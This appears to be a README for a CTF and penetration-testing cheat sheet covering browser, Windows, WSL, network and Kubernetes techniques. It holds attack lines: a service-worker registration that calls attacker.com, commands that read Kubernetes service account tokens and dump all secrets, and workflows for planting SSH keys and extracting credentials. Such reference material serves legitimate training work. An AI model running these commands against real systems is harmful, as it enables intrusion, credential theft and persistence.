# ReflexShell CTF Command Arsenal v1.0

**A 36-command muscle-memory reference** for Capture The Flag competitions and penetration testing in hybrid infrastructure environments.

## 🎯 Overview

This arsenal is designed for rapid command deployment across:
- **4-node Kubernetes cluster**: athena, nova, lyra, ipower
- **8-router mesh network** with Tailscale
- **Hybrid OS environment**: Windows + WSL2/MINGW64

The commands are organized into a **6×6 grid** structure across six tactical domains, with each command tagged by CTF phase (recon, exploit, persist, exfil) for rapid situational deployment.

## 📁 File Structure

```
reflexshell_ctf_arsenal_v1.0.yaml    # Complete command arsenal YAML
REFLEXSHELL_CTF_ARSENAL_README.md    # This file
```

## 🗺️ Command Grid Structure

The arsenal uses a **6×6 grid** (36 commands total) organized by domain:

| Row | Domain | Grid Position | Commands | Focus |
|-----|--------|---------------|----------|-------|
| **A** | Browser & Service Worker Exploitation | A1-A6 | 6 | SW manipulation, CDP, fetch hooks |
| **B** | Browser Storage Forensics | B1-B6 | 6 | IndexedDB, localStorage, cookies |
| **C** | Windows Process Forensics | C1-C6 | 6 | Process trees, DLL injection, Sysmon |
| **D** | WSL/MINGW64 Hybrid Pivoting | D1-D6 | 6 | Cross-environment execution |
| **E** | IPv6 & Tailscale Mesh Recon | E1-E6 | 6 | Network discovery, MagicDNS |
| **F** | Kubernetes & Container Escape | F1-F6 | 6 | Docker breakout, K8s exploitation |

## 🎮 Quick Start

### 1. Load the Arsenal

```bash
# Parse the YAML file
python3 -c "import yaml; arsenal = yaml.safe_load(open('reflexshell_ctf_arsenal_v1.0.yaml'))"
```

### 2. View the Quick Reference Grid

```bash
# Extract and display the visual grid
python3 << 'EOF'
import yaml
with open('reflexshell_ctf_arsenal_v1.0.yaml') as f:
    data = yaml.safe_load(f)
    print(data['quick_reference']['grid'])
EOF
```

### 3. Find Commands by Phase

```bash
# List all RECON commands
python3 << 'EOF'
import yaml
with open('reflexshell_ctf_arsenal_v1.0.yaml') as f:
    data = yaml.safe_load(f)
    print("RECON Commands:")
    for cmd_id in data['by_phase']['recon']['commands']:
        print(f"  - {cmd_id}")
EOF
```

## 📊 Phase Distribution

The arsenal reflects real CTF priorities:

- **RECON** (20 commands, ~54%): Enumeration determines success
- **EXPLOIT** (9 commands, ~25%): Core attack techniques  
- **EXFIL** (5 commands, ~14%): Data extraction methods
- **PERSIST** (3 commands, ~8%): Maintaining access

## 🎯 Domain-Specific Usage

### Domain A: Browser Exploitation

Start with Service Worker enumeration, then move to exploitation:

```javascript
// A1: Enumerate all Service Workers
navigator.serviceWorker.getRegistrations().then(r => 
  r.forEach(sw => console.log(sw.scope, sw.active?.scriptURL)))

// A2: Register malicious SW (if XSS + upload available)
navigator.serviceWorker.register('/uploaded/sw.js', {scope: '/'})
  .then(() => fetch('https://attacker.com/sw_registered'))
```

### Domain C: Windows Forensics

Map the process landscape first:

```powershell
# C1: Full process tree
Get-CimInstance Win32_Process | Select ProcessId, ProcessName, ParentProcessId, CommandLine | Sort ParentProcessId

# C2: Detect DLL injection
(Get-Process -Name "TARGET").Modules | Where {$_.FileName -notmatch "C:\\Windows\\"} | Select ModuleName, FileName
```

### Domain F: Kubernetes Exploitation

Standard progression for K8s pod compromise:

```bash
# F4: Extract service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify auth can-i --list

# F5: Dump secrets (if authorized)
kubectl get secrets --all-namespaces -o yaml
```

## 🔄 Workflow Examples

### Workflow 1: K8s Cluster Compromise

Target your 4-node cluster (athena, nova, lyra, ipower):

1. **F4**: Extract SA token from initial pod
2. **F5**: Dump secrets if permitted
3. **F6**: Create privileged pod on athena
4. **F3**: Mount host disk, plant SSH keys
5. **F6**: Repeat for nova, lyra, ipower

### Workflow 2: Browser Forensics

Complete web storage extraction:

1. **A1**: Enumerate Service Workers
2. **B2**: Dump all storage (localStorage, sessionStorage, cookies)
3. **B1**: Deep IndexedDB extraction
4. **B4**: Export as forensic JSON
5. **B3**: Exfiltrate via XSS if available

### Workflow 3: Hybrid WSL Pivot

Windows ↔ WSL pivoting chain:

1. **D4**: Enumerate WSL from Windows (`\\wsl$\Ubuntu\`)
2. **D2**: Execute Windows commands from WSL
3. **D1**: Extract Windows credentials from WSL
4. **D6**: Establish SOCKS proxy through WSL
5. **D3**: Use WSL as LOLBIN for persistence

### Workflow 4: IPv6 Mesh Recon

IPv6 + Tailscale network mapping:

1. **E1**: IPv6 multicast discovery (`ping6 ff02::1`)
2. **E3**: Fast enumeration with alive6
3. **E2**: Nmap service scan on discovered hosts
4. **E5**: Tailscale node mapping
5. **E6**: MagicDNS enumeration

## 🧠 Memorization Strategy

### Spatial Memory Grid

Each domain occupies a row (A-F), with commands flowing left-to-right from enumeration to exploitation:

| Row | Mnemonic |
|-----|----------|
| **A** | "Service Workers intercept everything" |
| **B** | "IDB holds the secrets, export JSON" |
| **C** | "CimInstance → DLLs → NetTCP → History → Logs → Sysmon" |
| **D** | "/mnt/c goes both ways, MinGW bridges, SOCKS tunnels" |
| **E** | "ping6 multicast → nmap -6 → alive6 → tshark → tailscale" |
| **F** | "Socket → cgroups → disk → token → secrets → nodeName" |

### Practice Method

1. **Cover** the syntax section of each command
2. **Recall** the full command from the ID and mnemonic
3. **Verify** against the syntax in the YAML file
4. **Drill** commands within the same row (they share syntactic patterns)

## 🔍 Detection Checks

Run these checks first to understand your environment:

### Container Context
```bash
# Are we in a container?
cat /proc/1/cgroup | grep -q docker && echo 'CONTAINER'

# Do we have elevated privileges?
ip link add dummy0 type dummy 2>/dev/null && echo 'PRIVILEGED'
```

### Kubernetes Context
```bash
# Are we in a K8s pod?
ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

### WSL Context
```bash
# From WSL: Are we in WSL?
grep -q WSL /proc/version && echo 'WSL'

# From Windows: List WSL distros
wsl.exe --list --verbose
```

### Tailscale Context
```bash
# Is Tailscale available?
tailscale status >/dev/null 2>&1 && echo 'TAILSCALE'
```

## 📚 Command Reference

### By ID (Grid Position)

Each command has a unique ID (A1-A6, B1-B6, etc.) for rapid reference.

Example:
- **A1**: SW enumerate all
- **F4**: K8s SA token extract
- **D6**: WSL SOCKS pivot

### By Phase

Commands are tagged with their primary CTF phase:

- **recon**: Enumeration and discovery
- **exploit**: Active exploitation techniques
- **persist**: Maintaining access
- **exfil**: Data extraction and exfiltration

### By Domain

Commands are organized by operational domain:

1. **browser_exploitation**: Web application attack surface
2. **storage_forensics**: Browser data extraction
3. **windows_forensics**: Windows system analysis
4. **wsl_pivot**: Cross-platform pivoting
5. **network_recon**: Network discovery and mapping
6. **container_k8s**: Container and orchestration exploitation

## 🎓 Learning Path

### Beginner
1. Start with **Domain C** (Windows Forensics) - most straightforward
2. Master **Domain B** (Storage Forensics) - immediate value in web CTFs
3. Learn **Domain E** (Network Recon) - fundamental networking skills

### Intermediate
1. **Domain A** (Browser Exploitation) - requires JS knowledge
2. **Domain D** (WSL Pivot) - cross-platform understanding
3. **Domain F** (K8s/Container) - start with F4 and F5

### Advanced
1. Chain workflows across multiple domains
2. Practice container escape techniques (F1, F2, F3)
3. Master Service Worker exploitation (A2, B6)

## ⚠️ Legal and Ethical Use

This arsenal is designed for:
- ✅ Authorized penetration testing engagements
- ✅ Capture The Flag competitions
- ✅ Security research in controlled environments
- ✅ Educational purposes with proper authorization

**Never use these techniques against systems you don't own or have explicit authorization to test.**

## 🔗 References

Commands include references to authoritative sources:

- **PortSwigger**: XSS exploitation techniques
- **HackTricks**: Container escape methods
- **MITRE ATT&CK**: Tactics and techniques
- **Null Byte**: Cross-compilation guides
- **Tailscale Docs**: MagicDNS and troubleshooting

## 📝 YAML Structure

The `reflexshell_ctf_arsenal_v1.0.yaml` file contains:

```yaml
meta:                      # Version, author, target environment
browser_exploitation:      # Domain A commands
storage_forensics:         # Domain B commands
windows_forensics:         # Domain C commands
wsl_pivot:                # Domain D commands
network_recon:            # Domain E commands
container_k8s:            # Domain F commands
quick_reference:          # Visual grid and mnemonics
by_phase:                 # Commands grouped by phase
workflows:                # Pre-built attack chains
detection_checks:         # Environment verification
memorization:             # Learning strategy
```

## 🚀 Integration Examples

### Bash Script Integration

```bash
#!/bin/bash
# Extract a specific command by ID

ARSENAL_FILE="reflexshell_ctf_arsenal_v1.0.yaml"
COMMAND_ID="$1"

python3 << EOF
import yaml
import sys

with open('$ARSENAL_FILE') as f:
    data = yaml.safe_load(f)

# Search all domains for the command
domains = ['browser_exploitation', 'storage_forensics', 'windows_forensics',
           'wsl_pivot', 'network_recon', 'container_k8s']

for domain in domains:
    for cmd in data[domain]['commands']:
        if cmd['id'] == '$COMMAND_ID':
            print(f"Command: {cmd['name']}")
            print(f"Phase: {cmd['phase']}")
            print(f"Description: {cmd['description']}")
            print(f"\nSyntax:\n{cmd['syntax']}")
            sys.exit(0)

print(f"Command {COMMAND_ID} not found")
sys.exit(1)
EOF
```

Usage: `./get_command.sh F4`

### Python API

```python
import yaml

class CTFArsenal:
    def __init__(self, yaml_file='reflexshell_ctf_arsenal_v1.0.yaml'):
        with open(yaml_file) as f:
            self.data = yaml.safe_load(f)
    
    def get_command(self, cmd_id):
        """Get command by ID (e.g., 'A1', 'F4')"""
        domains = ['browser_exploitation', 'storage_forensics', 
                   'windows_forensics', 'wsl_pivot', 'network_recon', 
                   'container_k8s']
        
        for domain in domains:
            for cmd in self.data[domain]['commands']:
                if cmd['id'] == cmd_id:
                    return cmd
        return None
    
    def get_phase_commands(self, phase):
        """Get all commands for a phase (recon/exploit/persist/exfil)"""
        return self.data['by_phase'][phase]['commands']
    
    def get_workflow(self, workflow_name):
        """Get a pre-defined workflow"""
        return self.data['workflows'][workflow_name]

# Usage
arsenal = CTFArsenal()
cmd = arsenal.get_command('F4')
print(f"{cmd['name']}: {cmd['description']}")
print(cmd['syntax'])
```

## 🎯 Competition Tips

1. **Print the grid**: Have the quick reference grid visible during competitions
2. **Phase-based approach**: Start with all RECON commands for your target environment
3. **Chain commands**: Use workflows as starting points, adapt to your situation
4. **Environment checks first**: Run detection checks before attempting exploits
5. **Document as you go**: Use the JSON export commands (B4) to save discoveries

## 📈 Version History

- **v1.0** (Current): Initial release with 36 commands across 6 domains

## 🤝 Contributing

To extend the arsenal:

1. Maintain the 6×6 grid structure
2. Tag commands with appropriate phases
3. Include context and trigger conditions
4. Add authoritative references
5. Test commands in target environments

## 📄 License

This arsenal is provided for educational and authorized security testing purposes only. Ensure compliance with all applicable laws and regulations.

---

**ReflexShell Automation** - Building muscle memory for hybrid infrastructure mastery
